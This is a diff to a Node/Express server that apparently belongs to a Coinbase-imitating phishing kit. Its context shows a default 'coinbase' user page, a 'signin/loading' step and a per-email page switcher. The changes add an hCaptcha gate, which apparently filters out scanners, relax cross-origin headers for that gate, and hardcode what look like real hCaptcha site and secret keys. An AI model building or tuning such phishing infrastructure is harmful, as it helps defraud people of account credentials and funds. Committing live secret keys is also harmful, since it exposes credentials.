@@ -18,8 +18,8 @@ const DEFAULT_USER_PAGE = "coinbase";
 const DEFAULT_LOADING_PAGE = "signin/loading";
 
 // hCaptcha config — replace with your real keys from hcaptcha.com
-const HCAPTCHA_SITE_KEY = "YOUR_SITE_KEY";
-const HCAPTCHA_SECRET_KEY = "YOUR_SECRET_KEY";
+const HCAPTCHA_SITE_KEY = "b2762c16-d68e-44dc-8358-b8aaf264989c";
+const HCAPTCHA_SECRET_KEY = "ES_e59314857d944e47bcbf7653d8344c8e";
 
 async function verifyHcaptcha(token) {
   try {
@@ -233,6 +233,8 @@ function updateUserPage(email, page) {
 }
 
 app.use((req, res, next) => {
+  // Skip COEP/COOP on the gate page — hCaptcha needs to load cross-origin resources
+  if (req.path === "/" || req.path === "/verify-gate") return next();
   res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
   res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
   next();
@@ -1859,7 +1861,7 @@ app.get("/signin/loading", async (req, res) => {
 /****************************************************
  * START
  ****************************************************/
-const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => {
+const PORT = process.env.PORT || 9000;
+app.listen(PORT, "127.0.0.1", () => {
   console.log("Server started on http://localhost:" + PORT);
 });
